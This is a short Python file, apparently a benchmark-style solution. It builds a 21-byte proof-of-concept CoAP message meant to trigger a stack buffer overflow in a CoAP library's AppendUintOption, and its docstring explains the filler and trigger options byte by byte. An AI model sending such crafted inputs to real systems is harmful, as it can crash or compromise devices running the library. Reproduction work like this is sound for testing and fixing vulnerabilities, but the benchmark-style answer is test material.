import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a stack buffer overflow in coap-message AppendUintOption.

        The PoC is a 21-byte CoAP message crafted to overflow a small stack buffer
        when the message is parsed and reconstructed by a vulnerable application.
        
        The message is constructed as follows:
        1. A 4-byte CoAP header (Version 1, Type CON, TKL 0, Code GET, MID 0x1234).
        2. A 12-byte "filler" option (1-byte header, 11-byte value) to consume
           most of the space in a hypothetical 16-byte buffer. The header 0xbb
           specifies Option Delta 11 and Length 11.
        3. A 5-byte "trigger" uint option (1-byte header, 4-byte value). The
           header 0x34 specifies Option Delta 3 and Length 4. This corresponds
           to Option Number 14 (11+3), which is Max-Age, a uint type.
           When the application tries to write this 5-byte option into the 4 bytes
           of remaining space in the buffer, a stack buffer overflow occurs.
        """
        
        # CoAP Header
        header = b'\x40\x01\x12\x34'
        
        # Filler Option (Delta=11, Length=11)
        filler = b'\xbb' + b'A' * 11
        
        # Trigger Option (Delta=3, Length=4)
        trigger = b'\x34\xff\xff\xff\xff'
        
        # Total PoC length = 4 + 12 + 5 = 21 bytes
        poc = header + filler + trigger
        
        return poc